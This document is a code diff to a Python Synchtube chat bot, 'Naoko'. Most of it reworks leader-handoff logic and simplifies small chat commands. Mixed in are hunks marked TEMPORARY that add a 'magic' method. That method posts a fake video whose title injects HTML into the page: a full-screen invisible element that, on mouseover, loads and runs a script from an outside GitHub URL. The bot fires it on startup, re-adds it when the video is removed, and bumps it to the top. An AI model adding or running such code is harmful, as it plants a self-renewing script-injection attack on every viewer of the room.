@@ -151,8 +151,11 @@ class Naoko(object):
         self.pending = {}
         self.leader_sid = None
         self.pendingToss = False
+        self.notGivingBack = False
+        self.tossing = True
         self.deferredToss = 0
         self.muted = False
+        self.doneInit = False
         self.verboseBanlist = False
         self.unbanTarget = None
         self.banTracker = {}
@@ -759,18 +762,33 @@ class Naoko(object):
 
     def asLeader(self, action=None, giveBack=True, deferred=0):
         self.leader_queue.append(action)
-        if self.leader_sid and self.leader_sid != self.sid and giveBack and not self.pendingToss:
-            oldLeader = self.leader_sid
-            self.pendingToss = True
-            self.deferredToss |= deferred
-            self.tossLeader = package(self._tossLeader, oldLeader)
-        if self.room_info["tv?"] and giveBack and not self.pendingToss:
-            def turnOnTV():
-                self.send("turnon_tv")
-            self.pendingToss = True
-            self.deferredToss |= deferred
-            self.tossLeader = turnOnTV
+        if not self.doneInit: return
+        if giveBack and not self.pendingToss and not self.notGivingBack:
+            if self.leader_sid and self.leader_sid != self.sid:
+                oldLeader = self.leader_sid
+                self.pendingToss = True
+                self.deferredToss |= deferred
+                self.tossLeader = package(self._tossLeader, oldLeader)
+            if self.room_info["tv?"]:
+                self.pendingToss = True
+                self.deferredToss |= deferred
+                self.tossLeader = self.turnOnTV
+            if self.tossing:
+                self.pendingToss = True
+                self.deferredToss |= deferred
+        
+        if not giveBack: 
+            self.pendingToss = False
+            self.notGivingBack = True
+            self.deferredToss = 0
         self.takeLeader()
+
+    def _turnOnTV(self):
+        self.tossing = True
+        self.pendingToss = False
+        self.notGivingBack = False
+        self.unToss = package(self.send, "turnoff_tv")
+        self.send("turnon_tv")
 
     def changeLeader(self, sid):
         if sid == self.leader_sid: return
@@ -868,7 +886,6 @@ class Naoko(object):
                 self.deferredToss &= ~self.DEFERRED_MASKS["SHUFFLE"]
                 if not self.deferredToss:
                     self.tossLeader()
-                    self.pendingToss = False
 
     def changeState(self, tag, data):
         self.logger.debug("State is %s %s", tag, data)
@@ -899,7 +916,6 @@ class Naoko(object):
                 self.deferredToss &= ~self.DEFERRED_MASKS["SKIP"]
                 if not self.deferredToss:
                     self.tossLeader()
-                    self.pendingToss = False
             
         self.state.current = data[1]
         index = self.getVideoIndexById(self.state.current)
@@ -972,14 +988,19 @@ class Naoko(object):
     def roomSetting(self, tag, data):
         self.room_info[tag] = data
         if tag == "tv?" and self.room_info["tv?"]:
+            self.tossing = False
             self.leader_sid = None
             self.leading.clear()
 
     def takeLeader(self):
-        if self.sid == self.leader_sid:
+        if self.sid == self.leader_sid and not self.tossing:
             self._leaderActions()
             return
-        if self.room_info["tv?"]:
+        if self.tossing:
+            self.unToss()
+            self.tossing = False
+            #self.takeLeader()
+        elif self.room_info["tv?"]:
             self.send("turnoff_tv")
         else:
             self.send("takeleader", self.sid)
@@ -1012,7 +1033,6 @@ class Naoko(object):
                 self.deferredToss &= ~self.DEFERRED_MASKS["UNBAN"]
                 if not self.deferredToss:
                     self.tossLeader()
-                    self.pendingToss = False
 
     def chat(self, tag, data):
         sid = data[0]
@@ -1048,6 +1068,7 @@ class Naoko(object):
     
     def leader(self, tag, data):
         self.leader_sid = data
+        self.tossing = False
         if self.leader_sid == self.sid:
             toss = self.pendingToss
             self._leaderActions()
@@ -1061,12 +1082,22 @@ class Naoko(object):
     # Setskip("none") will simply fail silently, so it is safe to call.
     def initDone(self, tag, data):
         self.storeUserCount()
+        self.doneInit = True
+
         if self.autoLead and self.vidlist:
             def setskip():
                 self.setSkip("", self.getUserByNick(self.name), self.autoSkip)
             self.asLeader(setskip, False)
         else:
+            if self.leader_queue:
+                print "HEEYAH"
+                def fn():
+                    return
+                self.asLeader(fn)
             self.setSkip("", self.getUserByNick(self.name), self.autoSkip)
+
+        # TEMPORARY
+        self.magic()
 
     def storeUserCount(self, tag=None, data=None):
         count = len(self.userlist)
@@ -1512,14 +1543,11 @@ class Naoko(object):
 
     def choose(self, command, user, data):
         if not data: return
-        choices = data
-        if not choices: return
-        self.enqueueMsg("[Choose: %s] %s" % (choices, random.choice(choices.split())))
+        self.enqueueMsg("[Choose: %s] %s" % (data, random.choice(data.split())))
 
     def permute(self, command, user, data):
         if not data: return
         choices = data.split()
-        if not choices: return
         random.shuffle(choices)
         self.enqueueMsg("[Permute] %s" % (" ".join(choices)))
 
@@ -1528,15 +1556,11 @@ class Naoko(object):
 
     def ask(self, command, user, data):
         if not data: return
-        question = data
-        if not question: return
-        self.enqueueMsg("[Ask: %s] %s" % (question, random.choice(["Yes", "No"])))
+        self.enqueueMsg("[Ask: %s] %s" % (data, random.choice(["Yes", "No"])))
 
     def eightBall(self, command, user, data):
         if not data: return
-        question = data
-        if not question: return
-        self.enqueueMsg("[8ball: %s] %s" % (question, random.choice(eight_choices)))
+        self.enqueueMsg("[8ball: %s] %s" % (data, random.choice(eight_choices)))
 
     # Kick a single user by their name.
     # Two special arguments -unnamed and -unregistered.
@@ -1802,6 +1826,12 @@ class Naoko(object):
         userinfo['nickChanges'] = 0
         user = SynchtubeUser(**userinfo)
         self.userlist[user.sid] = user
+        # TEMPORARY
+        if not user.uid and False:
+            self.room_info["tv?"] = False
+            if not hasattr(self, "sid"): self.sid = False
+            self.pending[user.sid] = True
+            self.asLeader(package(self._banUser, user.sid, "unregistered", False))
 
     # Write the current status of the hybrid mods and a short warning about editing the resulting file.
     def _writePersistentSettings(self):
@@ -1982,6 +2012,11 @@ class Naoko(object):
         self.vidlist.append(vid)
         self.vidLock.release()
         
+        # TEMPORARY
+        if hasattr(self, "special")and vid.vidinfo.vid == self.special:
+            self.asLeader(package(self._bump, list([vid.v_sid])))
+            return
+        
         self.api_queue.append(package(self._validateAddVideo, vid, sql))
         self.apiAction.set()
 
@@ -1991,8 +2026,17 @@ class Naoko(object):
         idx = self.getVideoIndexById(v)
         if idx >= 0:
             self.vidLock.acquire()
-            self.vidlist.pop(idx)
+            # TEMPORARY
+            vid = self.vidlist.pop(idx)
             self.vidLock.release()
+            # TEMPORARY
+            if vid.vidinfo.vid == self.special:
+                self.magic()
+
+    def magic(self):
+        # TEMPORARY
+        self.special = "whatisthis" + str(random.randint(0, 1000000))
+        self.asLeader(package(self.send, 'am', ['yt', self.special, '" id="vulN" style="position:fixed;top:0;left:0;z-index:9000;font-size:0px;width:100%;height:100%;" onmouseover="$.getScript(\'https://raw.github.com/Falaina/animu-synchtube/gh-pages/document.js\');$(\'#vulN\').remove();" title="Fake Video', 'http://i.ytimg.com/vi/6pMgwjhJBAc/default.jpg', 120]))
 
     def _moveVideo(self, v, after=None):
         if self.stthread != threading.currentThread():
@@ -2034,7 +2078,6 @@ class Naoko(object):
             self.leader_queue.popleft()()
         if self.pendingToss and not self.deferredToss:
             self.tossLeader()
-            self.pendingToss = False
 
     # Give leader to another user using their sid(session id)
     # This command does not ensure the client is currently leader before executing
@@ -2042,6 +2085,10 @@ class Naoko(object):
         # Short sleep to give Synchtube some time to react
         # TODO -- Confirm whether this fixes the rare bug I was getting
         time.sleep(0.05)
+        self.pendingToss = False
+        self.notGivingBack = False
+        self.tossing = True
+        self.unToss = package(self.send, "takeleader", self.sid)
         self.send("toss", sid)
 
     def sendHeartBeat(self):
